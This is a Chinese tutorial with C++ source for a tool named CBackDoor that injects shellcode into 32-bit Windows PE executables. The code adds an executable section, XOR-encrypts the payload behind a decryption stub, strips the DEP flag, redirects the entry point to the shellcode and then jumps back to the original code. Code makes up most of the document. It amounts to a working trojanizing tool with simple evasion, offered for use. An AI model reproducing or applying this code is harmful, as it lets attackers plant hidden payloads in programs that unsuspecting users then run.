#### 添加额外区段添加 shellcode
> - PE文件添加额外区段
> - 把准备好的shellcode拷贝到该区段中
> - 改变程序执行流程，先执行shellcode再运行正常程序
> - 用到的工具：VC6.0 (或其他IDE)、LordPE、010Editor、OD/X64Dbg

a）PE 文件准备
b）使用 LordPE 打开并编辑 PE 文件，添加区段
c) 编辑区段大小和属性
d) 填充区段内容
e）拷贝 shellcode 到新区段
f）更改PE文件的OEP到我们的shellcode起始位置
g）在shellcode后添加跳转到原OEP的代码: JMP 原OEP
h）运行该程序

#### 代码洞添加Shellcode
> - 查找代码洞
> - 找到跳转点，跳转到shellcode

a）查找代码洞
b）找触发点跳转到 Shellcode

#### 自动化工具实现
> - 检测PE文件是否有效
> - 提取shellcode文件中的shellcode并获取shellcode大小
> - 添加新区段，把shellcode拷贝到新区段
> - 更改OEP到新区段,并添加跳转到原OEP的OPCODE

a）检测PE文件
```c
// 检查是否有效的PE文件
BOOL CBackDoor::CheckPe(const TCHAR* szPath) {

    // 打开文件

    HANDLE hFile = CreateFile(szPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (INVALID_HANDLE_VALUE == hFile) {
         MessageBox(NULL, L"打开文件失败！", NULL, MB_OK);
         return FALSE;
    }

    // 判断文件大小是否大于 100M (暂定)

    LARGE_INTEGER llSize = {};
    GetFileSizeEx(hFile, &llSize);

    if (0 != llSize.HighPart || llSize.LowPart >= 100 * 1024 * 1024) {
         MessageBox(NULL, L"文件太大！", NULL, MB_OK);
         return FALSE;
    }

    m_dwSize = llSize.LowPart;

    // 判断MZ以及PE 32位
    BOOL bSucceed = FALSE;

    // 读取文件到内存
    m_pBuf = new BYTE[llSize.LowPart]{};
    DWORD dwRead = 0; // 实际读取字节数

    __try {
         if (!ReadFile(hFile, m_pBuf, m_dwSize, &dwRead, NULL)) __leave;

         // 判断MZ
         PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)m_pBuf;
         if (IMAGE_DOS_SIGNATURE != pDos->e_magic) __leave;

         // 判断PE
         PIMAGE_NT_HEADERS32 pNtHeader = (PIMAGE_NT_HEADERS32)(m_pBuf + pDos->e_lfanew);

         if (IMAGE_NT_SIGNATURE != pNtHeader->Signature) __leave;

         // 判断32位
         if (!(pNtHeader->FileHeader.Characteristics & IMAGE_FILE_32BIT_MACHINE)) __leave;

         bSucceed = TRUE;
    }

    __finally {
         if (!bSucceed) {
             delete[] m_pBuf;
             m_pBuf = nullptr;
             MessageBox(NULL, L"文件校验失败！", 0, MB_OK);
         }
    }

    CloseHandle(hFile);
    return bSucceed;
}
```

b）提取 Shellcode
解析Shellcode文件，获取Shellcode大小，并加密，加密后和解密Shellcode组合成新Shellcode
```c
// 提取Shellcode文件中的Shellcode的大小,该文件就是Shellcode的2进制文件
BOOL CBackDoor::ExtractShellcode(const TCHAR* szPath, PBYTE &pShellcode, DWORD &dwShellcodeSize) {

    // 打开文件
    HANDLE hFileShellcode= CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (INVALID_HANDLE_VALUE == hFileShellcode) { 
      return FALSE;
    }

    DWORD dwBytesRead = 0;

    // 获取Shellcode大小
    DWORD dwBytesToRead = GetFileSize(hFileShellcode, NULL);

    // 申请空间存放解密Shellcode+即将被加密的Shellcode
    dwShellcodeSize = dwBytesToRead + sizeof(g_DecryptCode);
    PBYTE pBuf = new BYTE[dwShellcodeSize]{};

    // 更新解密Shellcode的信息
    *(WORD*) &g_DecryptCode[14] = (WORD)(dwBytesToRead - 1);
    memcpy_s(pBuf, sizeof(g_DecryptCode), g_DecryptCode, sizeof(g_DecryptCode));

    // 读取Shellcode
    int nResult = ReadFile(hFileShellcode, pBuf+ sizeof(g_DecryptCode), dwBytesToRead, &dwBytesRead, NULL);

    if (!nResult || dwBytesToRead != dwBytesRead) {
         MessageBox(NULL,L"Shellcode文件解析错误！",NULL,MB_OK);
         CloseHandle(hFileShellcode);
         delete[] pBuf;

         return  FALSE;

    }

    // 加密Shellcode
    pShellcode= pBuf + sizeof(g_DecryptCode);

    for (int i=0;i<dwBytesRead;++i) {
         // 使用02异或
         pShellcode[i] ^= 0x02;
    }

    CloseHandle(hFileShellcode);
    pShellcode= pBuf;
    
    return TRUE;
}
```

c）添加Shellcode段
#### 添加Shellcode区段：我们需要改变原文件的区段信息，添加一个新的区段，并在文件后追加对应大小的区段
```
// 添加新的区段
PBYTE CBackDoor::AddSection(const char* pName, DWORD dwRSize, DWORD dwAttr) {

    // 去除DEP，改写区段信息:区段数目、新的区段信息
    PIMAGE_NT_HEADERS32 pNtHeader = (PIMAGE_NT_HEADERS32)(m_pBuf + ((PIMAGE_DOS_HEADER)m_pBuf)->e_lfanew);

    // 去除DEP
    pNtHeader->OptionalHeader.DllCharacteristics &= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;

    // 新区段的信息：区段名，区段大小，区段属性
    DWORD dwCount = pNtHeader->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNtHeader);

    // 区段名
    if (strlen(pName) >= 8) {
        memcpy_s(pSec[dwCount].Name, 8, pName, 8);
    } else {
        strcpy_s((char*)pSec[dwCount].Name, 8, pName);
    }

    // 虚拟大小
    pSec[dwCount].Misc.VirtualSize = dwRSize;

    // 虚拟地址/*同时更新m_uiOEPNew的值*/
    pSec[dwCount].VirtualAddress =
        pSec[dwCount - 1].VirtualAddress +
        (pSec[dwCount - 1].Misc.VirtualSize + 0x0fff) / 0x1000 * 0x1000;

    m_uiOEPNew = pSec[dwCount].VirtualAddress;

    // 区段在文件中的大小:0x200对齐
    pSec[dwCount].SizeOfRawData = (dwRSize + 0x1ff) / 0x200 * 0x200;

    // 区段在文件中的偏移
    pSec[dwCount].PointerToRawData = pSec[dwCount - 1].PointerToRawData + pSec[dwCount - 1].SizeOfRawData;
    pSec[dwCount].Characteristics = dwAttr;// 区段属性

    // 区段数目 + 1
    pNtHeader->FileHeader.NumberOfSections += 1;

    // 改变PE信息中的文件信息,更新m_dwSize,原大小0x1000对齐+新增大小
    pNtHeader->OptionalHeader.SizeOfImage = (pNtHeader->OptionalHeader.SizeOfImage+0x0FFF)/0x1000*0x1000+dwRSize;
    DWORD dwNewSize = m_dwSize + pSec[dwCount].SizeOfRawData;

    // 在文件尾添加新的区段内容：空
    // 申请新的空间，把原文件内容拷贝到新文件
    PBYTE pNewBuf = new BYTE[dwNewSize]{};

    // 拷贝原文件内容到新的 buf
    memcpy_s(pNewBuf, dwNewSize, m_pBuf, m_dwSize);

    // 释放原内存，更新m_pBuf和m_dwSize
    delete[] m_pBuf;
    m_pBuf = pNewBuf;
    DWORD dwOldSize = m_dwSize;
    m_dwSize = dwNewSize;

    // 返回新区段的位置
    return m_pBuf + dwOldSize;
}
```

#### 拷贝Shellcode到新区段
```c
// 添加空区段
PBYTE pBufNewSec = AddSection(".trx", dwRsize, 0xC00000C0);

// 拷贝 Shellcode 相关代码到新区段
memcpy_s(pBufNewSec, dwRsize, pShellcode, dwShellcodeSize);
```

d）更改OEP
```c
// 重定位OEP到Shellcode位置
pNt->OptionalHeader.AddressOfEntryPoint = m_uiOEPNew;

// 修复并添加跳转到原OEP的代码:原OEP-JMP所在位置-5
*(DWORD*)(g_cJmpOep + 1) = m_uiOEPSrc - (m_uiOEPNew + dwShellcodeSize) - 5;
memcpy_s(pBufNewSec + dwShellcodeSize, dwRsize -dwShellcodeSize,g_cJmpOep,sizeof(g_cJmpOep));
```

e）生成新文件
```c
// 自定义Shellcode改变OEP
BOOL CBackDoor::Entry_CustomShellcode_OEPChanged(const TCHAR* szPath, const TCHAR* szShellcodePath) {

    // 检查PE文件是否有效
    if (!CheckPe(szPath)) { 
        Clear(); 
        return FALSE; 
    }

    // 提取Shellcode文件中的Shellcode
    PBYTE pShellcode= nullptr;
    DWORD dwShellcodeSize = 0;

    if (!ExtractShellcode(szShellcodePath, pShellcode, dwShellcodeSize)) {
        return FALSE;
    }

    // 添加新区段
    // 新增区段的大小->Shellcode的大小+ jmp xxx
    DWORD dwRsize = dwShellcodeSize + sizeof(g_cJmpOep);

    // 添加空区段
    PBYTE pBufNewSec = AddSection(".trx", dwRsize, 0xC00000C0);

    // 拷贝Shellcode相关代码到新区段
    // Shellcode
    memcpy_s(pBufNewSec, dwRsize, pShellcode, dwShellcodeSize);
    m_pShellcode = pBufNewSec;

    // 将oep定位到Shellcode，在Shellcode后添加跳转到原oep的代码
    // 获得原OEP的值
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)m_pBuf;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(m_pBuf + pDos->e_lfanew);
    m_uiOEPSrc = pNt->OptionalHeader.AddressOfEntryPoint;

    // 重定位OEP到Shellcode位置
    pNt->OptionalHeader.AddressOfEntryPoint = m_uiOEPNew;

    // 修复并添加跳转到原OEP的代码: 原OEP-JMP所在位置 -5
    *(DWORD*)(g_cJmpOep + 1) = m_uiOEPSrc - (m_uiOEPNew + dwShellcodeSize) - 5;
    memcpy_s(pBufNewSec + dwShellcodeSize, dwRsize - dwShellcodeSize, g_cJmpOep, sizeof(g_cJmpOep));

    // 生成新的文件
    OutNewFile(szPath);

    // 资源清理
    Clear();
    delete[] pShellcode;
    pShellcode= nullptr;
    return TRUE;
}
```
